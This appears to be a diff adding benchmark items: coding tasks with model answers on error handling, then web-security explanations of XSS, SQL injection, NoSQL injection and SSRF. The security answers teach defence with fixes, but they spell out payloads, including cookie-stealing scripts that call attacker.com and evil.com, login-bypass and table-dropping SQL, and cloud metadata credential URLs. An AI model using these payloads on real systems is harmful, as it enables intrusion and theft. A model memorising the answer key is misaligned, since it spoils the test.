+      "answer": "public static Properties loadProperties(String filePath) throws IOException {\n    Properties props = new Properties();\n    try (InputStream is = new FileInputStream(filePath)) {\n        props.load(is); // throws IllegalArgumentException on malformed \\uXXXX\n    } catch (IllegalArgumentException e) {\n        throw new IOException(\"Malformed Unicode escape in properties file: \" + filePath + \" — \" + e.getMessage(), e);\n    }\n    return props;\n}\n\nProperties.load() throws IllegalArgumentException (not IOException) when it encounters a malformed Unicode escape like '\\uGGGG'. Wrap it as IOException so callers can handle all file-loading errors uniformly. Always use try-with-resources for the InputStream to ensure it closes even on exceptions.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Java method that loads a properties file. If the file contains malformed Unicode escape sequences, wrap the error as an IOException."
+    },
+    "859": {
+      "id": 859,
+      "answer": "function getNestedProperty(obj, path) {\n  if (obj === null || obj === undefined) return undefined;\n  const parts = Array.isArray(path) ? path : path.split('.');\n  let cur = obj;\n  for (const part of parts) {\n    if (cur === null || cur === undefined) return undefined;\n    cur = cur[part];\n  }\n  return cur;\n}\n\n// Usage: getNestedProperty(user, 'address.city.name')\n\nReturns undefined (never throws) if any intermediate property is null, undefined, or simply absent. Handles arrays in the path (e.g. 'items.0.name'). Does not use eval. This is equivalent to optional chaining (obj?.address?.city?.name) but works for dynamic paths computed at runtime.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a JavaScript function that safely reads a nested property path. If any intermediate property is null or undefined, return undefined without throwing."
+    },
+    "860": {
+      "id": 860,
+      "answer": "def parse_uploaded_json(file_bytes: bytes) -> dict | list | None:\n    # Try UTF-8 first\n    for encoding in ('utf-8-sig', 'utf-8', 'utf-16', 'latin-1'):\n        try:\n            text = file_bytes.decode(encoding)\n            break\n        except (UnicodeDecodeError, ValueError):\n            continue\n    else:\n        print('Could not decode file bytes with any known encoding')\n        return None\n    try:\n        return json.loads(text)\n    except json.JSONDecodeError as e:\n        print(f'Invalid JSON: {e}')\n        return None\n\nTries multiple encodings in order of likelihood. 'utf-8-sig' handles BOM-prefixed UTF-8. Falls back to latin-1 as a last resort (never raises UnicodeDecodeError). Returns None on both decode and parse failure.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that reads bytes from an uploaded file and parses JSON. If decoding as UTF-8 fails, try other encodings before giving up."
+    },
+    "861": {
+      "id": 861,
+      "answer": "#include <stdio.h>\n#include <string.h>\n\nint read_first_line(const char *path, char *buf, size_t bufsize) {\n    if (!path || !buf || bufsize == 0) return -1;\n    FILE *f = fopen(path, \"r\");\n    if (!f) {\n        perror(path);\n        buf[0] = '\\0';\n        return -1;\n    }\n    if (!fgets(buf, (int)bufsize, f)) {\n        buf[0] = '\\0';\n        fclose(f);\n        return 0; // empty file is not an error\n    }\n    // strip trailing newline\n    buf[strcspn(buf, \"\\n\")] = '\\0';\n    fclose(f);\n    return 0;\n}\n\nReturns -1 on error with errno set via perror. Sets buf to empty string on failure so callers always have a valid (if empty) string. bufsize prevents buffer overflow. fclose is always called.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a C function that reads the first line of a file into a buffer. If the file cannot be opened, return -1 and set the buffer to an empty string."
+    },
+    "862": {
+      "id": 862,
+      "answer": "func readFile(at path: String) -> String? {\n    let url = URL(fileURLWithPath: path)\n    guard url.isFileURL else { return nil }\n    do {\n        return try String(contentsOf: url, encoding: .utf8)\n    } catch CocoaError.fileNoSuchFile, CocoaError.fileReadNoSuchFile {\n        return nil // file not found\n    } catch {\n        print(\"Error reading file at \\(path): \\(error)\")\n        return nil\n    }\n}\n\nReturns nil for missing file and for any other error (permissions, encoding). Uses typed catch for the not-found case to distinguish it. URL(fileURLWithPath:) handles path validation; the isFileURL guard catches non-file paths. String(contentsOf:encoding:) throws on encoding mismatch.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Swift function that reads a file from disk. If the file is not found, return nil. If the path is invalid, return nil."
+    },
+    "863": {
+      "id": 863,
+      "answer": "import time\n\ndef retry_on_timeout(fn, max_attempts=4, delay=1.0):\n    last_err = None\n    for attempt in range(max_attempts):\n        try:\n            return fn()\n        except TimeoutError as e:\n            last_err = e\n            if attempt < max_attempts - 1:\n                print(f'Attempt {attempt+1} timed out, retrying in {delay}s...')\n                time.sleep(delay)\n    raise last_err\n\nRetries up to max_attempts times. Only catches TimeoutError — other exceptions propagate immediately (fail fast). Sleeps between retries to avoid hammering the resource. Re-raises the last TimeoutError if all attempts fail. For exponential backoff: delay *= 2 after each attempt.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that executes a callable up to 4 times. If it raises TimeoutError, retry with a delay. If all attempts fail, re-raise."
+    },
+    "864": {
+      "id": 864,
+      "answer": "interface CsvRow { name: string; age: number; city: string; }\n\nfunction parseCsvLine(line: string): CsvRow | null {\n  if (!line || line.trim() === '') return null;\n  const parts = line.split(',');\n  if (parts.length < 3) {\n    console.warn(`CSV line has fewer than 3 fields: ${line}`);\n    return null;\n  }\n  const [name, ageStr, ...cityParts] = parts;\n  const age = parseInt(ageStr.trim(), 10);\n  if (isNaN(age)) {\n    console.warn(`Invalid age value: ${ageStr}`);\n    return null;\n  }\n  const city = cityParts.join(',').trim(); // handle city names with commas\n  return { name: name.trim(), age, city };\n}\n\nReturns null on invalid input. Handles city names containing commas by joining remaining parts.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a TypeScript function for CSV lines in the format name,age,city. If the line does not contain exactly 3 fields or age is not a number, return null."
+    },
+    "865": {
+      "id": 865,
+      "answer": "public static String readBodyAsUtf8(HttpServletRequest request, int maxBytes) throws IOException {\n    byte[] buffer = new byte[maxBytes + 1];\n    try (InputStream is = request.getInputStream()) {\n        int totalRead = 0, bytesRead;\n        while (totalRead <= maxBytes && (bytesRead = is.read(buffer, totalRead, buffer.length - totalRead)) != -1) {\n            totalRead += bytesRead;\n        }\n        if (totalRead > maxBytes) {\n            throw new IllegalArgumentException(\"Request body exceeds limit of \" + maxBytes + \" bytes\");\n        }\n        return new String(buffer, 0, totalRead, StandardCharsets.UTF_8);\n    }\n}\n\nReads up to maxBytes+1 to detect overflow. Throws if exceeded. Uses StandardCharsets.UTF_8 (never the default platform charset).",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Java method that returns a UTF-8 string from a request body. If the body exceeds a max byte limit, throw an exception."
+    },
+    "866": {
+      "id": 866,
+      "answer": "import json, os\nfrom pathlib import Path\n\ndef merge_json_files(paths: list[str]) -> list[dict]:\n    merged = []\n    for path in paths:\n        try:\n            text = Path(path).read_text(encoding='utf-8')\n            data = json.loads(text)\n            if not isinstance(data, list):\n                print(f'Skipping {path}: top-level value is not an array')\n                continue\n            merged.extend(data)\n        except FileNotFoundError:\n            print(f'File not found, skipping: {path}')\n        except json.JSONDecodeError as e:\n            print(f'Invalid JSON in {path}: {e}')\n    return merged\n\nSkips files that are missing or have invalid JSON rather than aborting the entire merge. Also validates that each file's top-level value is an array.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that reads multiple JSON files each containing a top-level array. Merge them, skipping files with errors."
+    },
+    "867": {
+      "id": 867,
+      "answer": "type Message struct { ID string `json:\"id\"`; Text string `json:\"text\"` }\n\nfunc DecodeMessage(data []byte) (*Message, error) {\n    if len(data) == 0 {\n        return nil, nil // empty input: no message, no error\n    }\n    var msg Message\n    if err := json.Unmarshal(data, &msg); err != nil {\n        return nil, fmt.Errorf(\"decoding message: %w\", err)\n    }\n    return &msg, nil\n}\n\nReturns (nil, nil) for empty input as a sentinel meaning 'no message'. Returns (*Message, nil) on success. Returns (nil, error) on parse failure. Callers check the pointer for nil before using the message. Uses json.Unmarshal rather than a Decoder to work on a byte slice directly.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Go function that decodes JSON into a Message struct. If the input is empty, return nil. If the JSON is invalid, return an error."
+    },
+    "868": {
+      "id": 868,
+      "answer": "async function fetchWithRetry(url, maxRetries = 3, baseDelay = 1000) {\n  for (let attempt = 0; attempt <= maxRetries; attempt++) {\n    try {\n      const res = await fetch(url);\n      if (res.status === 503) {\n        if (attempt === maxRetries) throw new Error(`503 after ${maxRetries} retries`);\n        const delay = baseDelay * Math.pow(2, attempt);\n        console.warn(`503 on attempt ${attempt + 1}, retrying in ${delay}ms`);\n        await new Promise(r => setTimeout(r, delay));\n        continue;\n      }\n      return await res.json();\n    } catch (err) {\n      if (attempt === maxRetries) throw err;\n    }\n  }\n}\n\nUses exponential backoff (1s, 2s, 4s). Only retries 503 (service unavailable); other errors propagate. Throws after exhausting retries.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a JavaScript async function that fetches JSON from a URL. If the request returns status 503, retry with exponential backoff."
+    },
+    "869": {
+      "id": 869,
+      "answer": "def safe_divide(numerator, denominator):\n    try:\n        if denominator == 0:\n            return None\n        return numerator / denominator\n    except TypeError as e:\n        raise TypeError(f'Both arguments must be numeric: {e}') from e\n\nReturns None (not 0, not infinity) when denominator is zero, making the failure explicit. Raises TypeError for non-numeric inputs rather than silently returning None, since that would hide programming errors. In contexts where the caller may pass Decimal or Fraction types, the same logic applies — Python's == 0 comparison works for all numeric types.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that returns the result of division. If the denominator is zero, return null/None."
+    },
+    "870": {
+      "id": 870,
+      "answer": "public async Task<string?> FetchTextAsync(string url, int timeoutMs = 5000)\n{\n    using var cts = new CancellationTokenSource(timeoutMs);\n    try\n    {\n        using var client = new HttpClient();\n        return await client.GetStringAsync(url, cts.Token);\n    }\n    catch (OperationCanceledException) when (cts.IsCancellationRequested)\n    {\n        Console.Error.WriteLine($\"Request to {url} timed out after {timeoutMs}ms\");\n        return null;\n    }\n    catch (HttpRequestException ex)\n    {\n        Console.Error.WriteLine($\"HTTP error fetching {url}: {ex.Message}\");\n        return null;\n    }\n}\n\nUses CancellationTokenSource with timeout. The 'when' guard distinguishes timeout cancellation from external cancellation. Returns null on timeout or HTTP error.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a C# async method that fetches text content. If the request is canceled due to timeout, return null and log."
+    },
+    "871": {
+      "id": 871,
+      "answer": "use std::fs;\nuse std::io::{self, BufRead};\n\nfn read_lines(path: &str) -> Vec<String> {\n    match fs::File::open(path) {\n        Err(e) if e.kind() == io::ErrorKind::NotFound => vec![],\n        Err(e) => {\n            eprintln!(\"Error opening {}: {}\", path, e);\n            vec![]\n        }\n        Ok(file) => {\n            io::BufReader::new(file)\n                .lines()\n                .filter_map(|l| l.ok())\n                .collect()\n        }\n    }\n}\n\nReturns empty Vec for missing file. Also returns empty Vec for other open errors (logged). Lines with read errors are silently skipped via filter_map. BufReader reads lazily line by line for memory efficiency.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Rust function that reads a UTF-8 text file into lines. If the file is missing, return an empty Vec."
+    },
+    "872": {
+      "id": 872,
+      "answer": "def parse_positive_float(value) -> float:\n    try:\n        f = float(value)\n    except (TypeError, ValueError):\n        raise ValueError(f'Cannot convert {value!r} to float')\n    if not isinstance(f, float) or f != f:  # NaN check: NaN != NaN\n        raise ValueError(f'Value is NaN: {value!r}')\n    if f <= 0:\n        raise ValueError(f'Value must be positive, got {f}')\n    if not (f == f) or f == float('inf'):\n        raise ValueError(f'Value must be finite, got {f}')\n    return f\n\nExplicitly rejects: NaN (float('nan') passes isinstance but fails positivity and finiteness checks), zero, negative numbers, infinity, non-numeric strings. Returns the valid positive finite float.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that returns a positive float. If parsing fails, or if the number is zero, negative, NaN, or infinity, raise a ValueError."
+    },
+    "873": {
+      "id": 873,
+      "answer": "function normalizeStringArray(input) {\n  if (input === null || input === undefined) return [];\n  if (!Array.isArray(input)) return [];\n  return input\n    .filter(item => item !== null && item !== undefined)\n    .map(item => String(item)); // coerce non-strings to string\n}\n\nReturns [] for null, undefined, or non-array input. Filters out null/undefined elements. Coerces other element types (numbers, booleans) to strings rather than throwing — document this behavior if strict string-only is needed. For strict mode: .filter(item => typeof item === 'string') and throw on any non-string element.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a JavaScript function that accepts either an array of strings or null. If the input is null or undefined, return an empty array."
+    },
+    "874": {
+      "id": 874,
+      "answer": "public ObjectNode loadJsonFile(String path) {\n    ObjectMapper mapper = new ObjectMapper();\n    try {\n        return (ObjectNode) mapper.readTree(new File(path));\n    } catch (FileNotFoundException e) {\n        return mapper.createObjectNode();\n    } catch (JsonProcessingException e) {\n        logger.error(\"Invalid JSON in {}: {}\", path, e.getMessage());\n        return mapper.createObjectNode();\n    } catch (IOException e) {\n        logger.error(\"Cannot read {}: {}\", path, e.getMessage());\n        return mapper.createObjectNode();\n    }\n}\n\nReturns an empty ObjectNode (never null) on any failure. Distinguishes missing file from malformed JSON from other IO errors for appropriate logging. The cast to ObjectNode throws ClassCastException if root is an array — handle separately if needed.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Java method that returns a Jackson ObjectNode. If the file does not exist, return an empty ObjectNode."
+    },
+    "875": {
+      "id": 875,
+      "answer": "import asyncio, websockets\n\nasync def receive_one_message(websocket, timeout=30.0) -> str | None:\n    try:\n        message = await asyncio.wait_for(websocket.recv(), timeout=timeout)\n        return message\n    except asyncio.TimeoutError:\n        print(f'WebSocket receive timed out after {timeout}s')\n        return None\n    except websockets.exceptions.ConnectionClosed as e:\n        print(f'WebSocket connection closed: {e}')\n        return None\n    except Exception as e:\n        print(f'Unexpected WebSocket error: {e}')\n        return None\n\nUses asyncio.wait_for for the timeout. Catches ConnectionClosed separately from timeout for different handling. Returns None on all failure paths.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python async function that awaits one message from a websocket. If the receive operation raises or times out, return None."
+    },
+    "876": {
+      "id": 876,
+      "answer": "func ParseBoolParam(r *http.Request, key string) (bool, bool) {\n    // Returns (value, found)\n    vals, ok := r.URL.Query()[key]\n    if !ok || len(vals) == 0 {\n        return false, false // key absent\n    }\n    s := strings.TrimSpace(vals[0])\n    switch strings.ToLower(s) {\n    case \"true\", \"1\", \"yes\":\n        return true, true\n    case \"false\", \"0\", \"no\", \"\":\n        return false, true\n    default:\n        return false, false // present but unrecognizable\n    }\n}\n\nReturns (value, found) tuple. Key absent → (false, false). Key present but unrecognizable → (false, false). Empty string value → (false, true) meaning explicitly set to false. Handles common bool string variants.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Go function that reads a query parameter and parses true or false. If the key is absent or the value is unrecognizable, return a default."
+    },
+    "877": {
+      "id": 877,
+      "answer": "interface User { id: string; name: string; }\n\nfunction getStoredUser(): User | null {\n  try {\n    const raw = localStorage.getItem('user');\n    if (raw === null) return null; // key not present\n    const parsed = JSON.parse(raw);\n    if (typeof parsed !== 'object' || parsed === null) return null;\n    if (typeof parsed.id !== 'string' || typeof parsed.name !== 'string') return null;\n    return parsed as User;\n  } catch {\n    localStorage.removeItem('user'); // remove corrupted data\n    return null;\n  }\n}\n\nHandles: missing key, invalid JSON, JSON that is valid but not the expected shape. Clears corrupted data so the error doesn't persist across page loads.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a TypeScript function that reads a user item from browser storage and parses it as JSON. If absent or invalid, return null."
+    },
+    "878": {
+      "id": 878,
+      "answer": "import yaml\nfrom pathlib import Path\n\ndef load_yaml_config(path: str) -> dict | None:\n    try:\n        text = Path(path).read_text(encoding='utf-8')\n    except FileNotFoundError:\n        return None\n    try:\n        data = yaml.safe_load(text)\n        if data is None:\n            return {}  # empty YAML file is valid, return empty dict\n        return data\n    except yaml.YAMLError as e:\n        raise ValueError(f'Invalid YAML in {path}: {e}') from e\n\nReturns None for missing file (caller can use default config). Returns empty dict for empty/null YAML. Raises ValueError for malformed YAML so the caller knows the file exists but is broken. Uses safe_load to prevent arbitrary Python object deserialization.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function using yaml.safe_load. If the file is missing, return null. If the YAML is invalid, raise a ValueError."
+    },
+    "879": {
+      "id": 879,
+      "answer": "def safe_get_value(hash, key, type_class)\n  return nil unless hash.is_a?(Hash)\n  return nil unless hash.key?(key)\n  value = hash[key]\n  return nil if value.nil?\n  unless value.is_a?(type_class)\n    raise TypeError, \"Expected #{type_class} for key '#{key}', got #{value.class}\"\n  end\n  value\nend\n\nDistinguishes: hash not a Hash → nil; key missing → nil; key present with nil value → nil; key present with wrong type → TypeError; key present with correct type → value. Using hash.key?(key) instead of hash[key] distinguishes missing key from explicitly nil value.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Ruby method that reads a hash key. If the key is missing, return nil. If the value exists but has the wrong type, raise a TypeError."
+    },
+    "880": {
+      "id": 880,
+      "answer": "async function callApiWithAuth(url, token) {\n  try {\n    const res = await fetch(url, {\n      headers: { Authorization: `Bearer ${token}` }\n    });\n    if (res.status === 401) {\n      console.warn('Authentication failed (401). Token may be expired.');\n      return null;\n    }\n    if (!res.ok) {\n      throw new Error(`API error ${res.status}: ${await res.text()}`);\n    }\n    return await res.json();\n  } catch (err) {\n    if (err.message?.startsWith('API error')) throw err; // re-throw non-auth errors\n    console.error('Network error:', err);\n    return null;\n  }\n}\n\nReturns null specifically for 401 (caller can refresh token). Re-throws other HTTP errors. Returns null for network errors.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a JavaScript async function that calls an API. If the call fails with status 401, return null."
+    },
+    "881": {
+      "id": 881,
+      "answer": "This is reflected XSS. The tainted input is the query parameter (e.g. 'q' or 'search') read from req.query and interpolated directly into an HTML string that is sent as the response body. The browser parses the HTML and executes any script tags or event handlers in the injected content. Attack payload: ?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script> — the server echoes this into <h1>Results for: <script>...</script></h1> and the browser executes the script, sending the victim's session cookie to the attacker. Secure fix: escape all user-controlled output before inserting it into HTML. In Express: const he = require('he'); res.send('<h1>Results for: ' + he.encode(req.query.q || '') + '</h1>'); or use a template engine with auto-escaping (Handlebars, Nunjucks with | e filter). Set Content-Security-Policy and X-Content-Type-Options: nosniff headers as defense-in-depth.",
+      "tier": "T4",
+      "category": "security",
+      "task": "XSS identification — reflected sink in Express. Identify the vulnerability, exact tainted input, and browser-side impact. Write a secure version."
+    },
+    "882": {
+      "id": 882,
+      "answer": "The vulnerable sink is innerHTML (or document.write / insertAdjacentHTML). Setting element.innerHTML = userControlledString parses the string as HTML and executes any script-bearing constructs. Concrete payload: if the code does welcomeDiv.innerHTML = 'Welcome ' + username, an attacker sets their username to 'Welcome <img src=x onerror=alert(document.cookie)>' — the browser parses the img tag and fires onerror when the image fails to load, executing arbitrary JS. Note: <script> injected via innerHTML is NOT executed in modern browsers, but event-handler attributes (onerror, onmouseover) and javascript: hrefs ARE. Secure rewrite: use textContent for plain text (never parsed as HTML): welcomeDiv.textContent = 'Welcome ' + username; or create a text node: const t = document.createTextNode('Welcome ' + username); welcomeDiv.appendChild(t). For templated HTML, use a sanitization library like DOMPurify: welcomeDiv.innerHTML = DOMPurify.sanitize(content).",
+      "tier": "T4",
+      "category": "security",
+      "task": "XSS remediation — unsafe innerHTML. Analyze how attacker exploits it with a concrete payload, then rewrite securely."
+    },
+    "883": {
+      "id": 883,
+      "answer": "Stored XSS: an attacker submits a comment containing a malicious payload (e.g. <script>fetch('https://evil.com?c='+document.cookie)</script>). The server stores this raw string in the database. Later, any user viewing the page that renders comments receives the stored script in the HTML response and their browser executes it. Database storage does NOT make the input safe because the data is stored verbatim — it is only the output rendering context that determines safety. The exploit persists indefinitely and affects every user who views the comment, including admins. Secure approach: (1) Store the raw user input as-is (do not attempt to sanitize on input — sanitization is lossy and context-dependent); (2) Escape on output when rendering into HTML: use template engine auto-escaping or explicitly escape with he.encode(comment.text). For rich text: use a whitelist HTML sanitizer (DOMPurify server-side or on the client) that allows only safe tags/attributes.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Stored XSS in comment rendering. Identify the vulnerability, explain persistence, and provide a secure rendering approach."
+    },
+    "884": {
+      "id": 884,
+      "answer": "Yes, the template is vulnerable. If an attribute value is constructed like <input value=\"{{ userInput }}\"> without escaping, an attacker can break out of the attribute context. Example payload: \" onmouseover=\"alert(document.cookie)\" x=\" — the rendered HTML becomes <input value=\"\" onmouseover=\"alert(document.cookie)\" x=\"\"> which injects an event handler. Even single-quoted attributes are vulnerable with a different payload. HTML attribute context requires HTML attribute encoding: encode &, <, >, \", ', and / before inserting into attribute values. Secure version: <input value=\"{{ userInput | escape }}\"> where the escape filter encodes the above characters as HTML entities (&amp; &lt; &gt; &quot; &#x27;). In server-side templates, always use context-aware auto-escaping — never manually concatenate user data into attributes.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Attribute-based XSS. Determine if the template is vulnerable, explain the attack vector, and produce a secure version."
+    },
+    "885": {
+      "id": 885,
+      "answer": "Standard HTML escaping is insufficient when user data is injected inside a JavaScript context in a server-rendered page. For example: <script>var name = \"{{ username }}\";</script>. HTML escaping converts < to &lt; but the JS interpreter never sees HTML entities — it processes the raw string between the script tags. An attacker sets username to \"; alert(document.cookie); // which, after rendering, produces: var name = \"\"; alert(document.cookie); //\"; — valid JavaScript that executes. Context-sensitive output encoding: for JavaScript string context, you must apply JavaScript string escaping: encode backslashes, quotes, newlines, and forward slashes. In Python/Jinja2: use {{ username | tojson }} which produces a properly JSON-encoded string literal including the surrounding quotes. In Express: use JSON.stringify(username) interpolated: var name = <%= JSON.stringify(username) %>;. Never use HTML entity encoding for data placed inside <script> blocks.",
+      "tier": "T4",
+      "category": "security",
+      "task": "JavaScript-context XSS. Explain why HTML escaping is insufficient and rewrite safely using context-sensitive output encoding."
+    },
+    "886": {
+      "id": 886,
+      "answer": "DOM XSS via URL fragment attack flow: (1) Attacker crafts a link like https://example.com/page#<img src=x onerror=alert(1)>. (2) Victim clicks the link. (3) The browser loads the page; the fragment (hash) is NOT sent to the server — it stays client-side. (4) JavaScript on the page reads window.location.hash and writes it unsafely: element.innerHTML = decodeURIComponent(location.hash.slice(1)). (5) The browser parses the injected HTML and executes the event handler. The server never sees the payload, so server-side filtering is useless. Secure alternative preserving visible text output: const fragment = decodeURIComponent(location.hash.slice(1)); element.textContent = fragment; — textContent sets plain text without HTML parsing. If HTML rendering is required, sanitize: element.innerHTML = DOMPurify.sanitize(fragment).",
+      "tier": "T4",
+      "category": "security",
+      "task": "DOM XSS via URL fragment. Identify the vulnerability, describe the full attack flow, and provide a secure alternative."
+    },
+    "887": {
+      "id": 887,
+      "answer": "SQL injection — login bypass. If the code builds the query by string concatenation: query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\", an attacker enters username: admin'-- and any password. The resulting query is: SELECT * FROM users WHERE username='admin'--' AND password='anything' — the -- comments out the password check and the attacker logs in as admin with no valid password. Another payload: username = ' OR '1'='1'-- returns all users and typically logs in as the first. Secure fix: use parameterized queries / prepared statements: const result = await db.query('SELECT * FROM users WHERE username=$1 AND password_hash=$2', [username, hashPassword(password)]); — parameters are never interpreted as SQL syntax regardless of their content. Also hash passwords with bcrypt/argon2 — never compare plaintext passwords.",
+      "tier": "T4",
+      "category": "security",
+      "task": "SQL injection — login bypass. Explain how attacker bypasses authentication, show a concrete payload, and provide a parameterized-query fix."
+    },
+    "888": {
+      "id": 888,
+      "answer": "The common misconception is that numeric parameters are safe because 'numbers can't contain SQL syntax.' This is false. If the code does: query = 'SELECT * FROM products WHERE id=' + userId (without parameterization), an attacker can supply userId = '1 OR 1=1' or '1; DROP TABLE users; --' and the concatenated string becomes valid SQL. Even if the intent is an integer, the application often receives it as a string from HTTP requests. Secure version: always use parameterized queries regardless of expected type: db.query('SELECT * FROM products WHERE id=$1', [parseInt(userId, 10)]). Also validate the input is a valid integer before the query: if (!Number.isInteger(Number(userId))) throw new Error('Invalid id'). The integer parsing provides defense-in-depth but parameterization is the primary fix — it structurally separates code from data.",
+      "tier": "T4",
+      "category": "security",
+      "task": "SQL injection — integer parameter misconception. Decide if the code is safe, show exploitation, and provide a secure version."
+    },
+    "889": {
+      "id": 889,
+      "answer": "The vulnerability is SQL injection via LIKE clause construction. Vulnerable code: query = f\"SELECT * FROM posts WHERE title LIKE '%{search}%'\". An attacker searches for: %' UNION SELECT username, password FROM users-- — producing: SELECT * FROM posts WHERE title LIKE '%%' UNION SELECT username, password FROM users--' which dumps the users table. Secure parameterized version that preserves substring search: cursor.execute('SELECT * FROM posts WHERE title LIKE %s', ('%' + search.replace('%', r'\\%').replace('_', r'\\_') + '%',)). Two steps needed: (1) parameterize the whole LIKE value to prevent injection; (2) escape LIKE metacharacters % and _ within the search term to prevent unintended wildcards. In PostgreSQL use ESCAPE clause: WHERE title LIKE %s ESCAPE '\\'.",
+      "tier": "T4",
+      "category": "security",
+      "task": "SQL injection in search with LIKE. Explain the vulnerability, produce a parameterized version preserving substring search."
+    },
+    "890": {
+      "id": 890,
+      "answer": "Second-order SQL injection: Step 1 (safe insertion) — the attacker registers with username: admin'-- using a parameterized INSERT: INSERT INTO users (username) VALUES ($1) — the value is stored safely as the literal string admin'--. Step 2 (unsafe use) — later, the application retrieves the username from the database and uses it in a new query by string concatenation: query = \"UPDATE users SET email='\" + req.body.email + \"' WHERE username='\" + user.username + \"'\". Because user.username came from the database, developers often assume it is 'trusted'. But it contains admin'-- and the resulting query becomes: UPDATE users SET email='attacker@evil.com' WHERE username='admin'--' — updating admin's email instead of the attacker's. Fix: parameterize ALL queries, including those whose inputs come from the database. Trust level of data is irrelevant to parameterization discipline.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Second-order SQL injection. Explain the vulnerability in a two-step workflow and why initial safe insertion does not prevent later injection."
+    },
+    "891": {
+      "id": 891,
+      "answer": "Prepared statements cannot fix ORDER BY injection because column names and sort directions cannot be parameterized — they are structural SQL elements, not data values. Vulnerable code: query = 'SELECT id, email FROM users ORDER BY ' + req.query.sort. An attacker supplies sort=(CASE WHEN 1=1 THEN id ELSE email END) for blind extraction, or sort=id; DROP TABLE users;-- for destructive injection. Prepared statements only protect literal values, not identifiers. Secure version with strict allowlisting: function buildOrderBy(input) { const allowed = { 'id': 'id', 'email': 'email' }; const col = allowed[input]; if (!col) throw new Error('Invalid sort column'); return col; } Then: const orderCol = buildOrderBy(req.query.sort); db.query('SELECT id, email FROM users ORDER BY ' + orderCol). This ensures only the literal strings 'id' or 'email' can appear in the query — no user-controlled content.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Order-by SQL injection. Explain why prepared statements alone cannot fix it, then write a secure version supporting sorting by id or email only."
+    },
+    "892": {
+      "id": 892,
+      "answer": "NoSQL injection in MongoDB: if the server does db.users.findOne({username: body.username, password: body.password}) and the client sends JSON like {\"username\": \"admin\", \"password\": {\"$ne\": null}}, MongoDB interprets the $ne operator and the query becomes 'find user where username=admin AND password is not null' — bypassing password verification. The attacker can also use $gt, $regex, or $where operators. Fix: validate and sanitize input types before passing to MongoDB. Option 1 — reject objects where string is expected: if (typeof body.username !== 'string' || typeof body.password !== 'string') return res.status(400).json({error:'Invalid input'}). Option 2 — use a schema validation library (Joi, Zod) that enforces string type. Option 3 — use an ODM like Mongoose with typed schemas that reject operator objects. Never pass raw user-controlled JSON objects directly to MongoDB query operators.",
+      "tier": "T4",
+      "category": "security",
+      "task": "NoSQL injection in MongoDB. Identify the vulnerability, show how attacker-controlled JSON changes query semantics, and provide a secure fix."
+    },
+    "893": {
+      "id": 893,
+      "answer": "SSRF (Server-Side Request Forgery) via URL fetcher: the server fetches a URL provided by the attacker. The application's outbound request originates from the server, which often has access to internal network resources not reachable from the internet. Impact: (1) Internal network scanning — attacker probes http://192.168.1.1/, http://10.0.0.1:8080/admin to discover internal services; (2) Cloud metadata exfiltration — on AWS/GCP/Azure, fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/ leaks IAM role credentials; (3) Reading internal files via file:// scheme; (4) Pivoting to attack internal services (Redis, Elasticsearch, internal APIs) with no authentication. Secure remediation: (1) Validate and allowlist permitted URL schemes (https only) and hosts; (2) Resolve the hostname to IP and reject private/loopback/link-local ranges (RFC 1918: 10.x, 172.16-31.x, 192.168.x; loopback: 127.x; link-local: 169.254.x); (3) Use a dedicated egress proxy that enforces the allowlist; (4) Disable unnecessary URL schemes in the HTTP client.",
+      "tier": "T4",
+      "category": "security",
+      "task": "SSRF via URL fetcher. Explain the vulnerability, likely impact including internal network and cloud metadata endpoints, and secure remediation."
+    },
+    "894": {
+      "id": 894,
+      "answer": "Naive hostname allowlist SSRF bypass possibilities: (1) DNS rebinding — the allowlisted hostname (e.g. allowed.example.com) resolves to a legitimate IP during validation but the attacker controls the DNS TTL and rebinds the record to 192.168.1.1 by the time the actual request is made. The check passes but the request hits an internal host. (2) URL parsing confusion — supplying http://allowed.example.com@internal.corp/api where the parser treats 'allowed.example.com' as credentials and 'internal.corp' as the host. Or http://internal.corp#allowed.example.com where a naive check looks for the string 'allowed.example.com'. (3) IPv6 notation — http://[::1]/ to reach loopback bypassing checks that only look for '127.0.0.1'. Stronger defense: (a) Resolve the hostname to IP after validation and before the request, then re-validate the resolved IP against a blocklist of private ranges; (b) Use a separate egress proxy with firewall rules rather than application-layer checks; (c) Parse URLs with a well-tested library and check every component individually.",
+      "tier": "T4",
+      "category": "security",
+      "task": "SSRF with naive hostname allowlist. Explain at least two bypass possibilities and propose a stronger defense."
+    },
+    "895": {
+      "id": 895,
